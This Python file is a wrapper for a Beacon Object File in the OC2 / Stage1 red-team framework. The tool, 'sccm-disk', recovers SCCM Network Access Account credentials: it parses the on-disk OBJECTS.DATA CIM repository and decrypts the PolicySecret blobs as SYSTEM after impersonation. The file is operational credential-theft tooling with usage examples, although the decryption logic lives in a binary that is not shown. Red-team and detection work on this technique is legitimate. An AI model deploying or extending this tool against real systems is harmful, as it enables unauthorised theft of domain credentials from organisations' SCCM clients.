r"""
sccm-disk — OC2 wrapper for the sccm-disk BOF (SCCM CRED-4, on-disk OBJECTS.DATA).

Parses the SCCM CIM repository (OBJECTS.DATA) and decrypts the
CCM_NetworkAccessAccount PolicySecret blobs locally with CryptUnprotectData as
SYSTEM. The target path is optional; when omitted the BOF uses the default
C:\Windows\System32\wbem\Repository\OBJECTS.DATA location.
"""

from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding


class SccmDiskBOF(BaseBOFTask):
    def __init__(self):
        super().__init__(
            "sccm-disk",
            base_binary_name="sccm-disk",
        )

        self.parser.description = (
            "Recover SCCM Network Access Account credentials from the on-disk "
            "CIM repository (CRED-4). Parses OBJECTS.DATA for "
            "CCM_NetworkAccessAccount and decrypts the PolicySecret blobs as "
            "SYSTEM."
        )

        self.parser.add_argument(
            "target",
            nargs="?",
            default=None,
            help="Optional OBJECTS.DATA path "
                 "(default: C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA)",
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  sccm-disk\n"
            "  sccm-disk C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA\n\n"
            "Notes:\n"
            "  - Requires a high-integrity (admin) context.\n"
            "  - Runs local CryptUnprotectData as SYSTEM after impersonation.\n"
            "  - For live WMI policy recovery (CRED-3) use sccm-wmi instead.\n"
        )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple]:
        parsed = self.parser.parse_args(arguments)
        if parsed.target:
            # BOF expects: z   (target: zero-terminated UTF-8 string, or none)
            target = parsed.target.strip('"').strip("'")
            return [(BOFArgumentEncoding.STR, target)]
        return []

    def run(self, arguments: List[str]):
        self.parser.parse_args(arguments)
        self.append_response("[*] Triaging SCCM on-disk OBJECTS.DATA (CRED-4)\n\n")
        super().run(arguments)
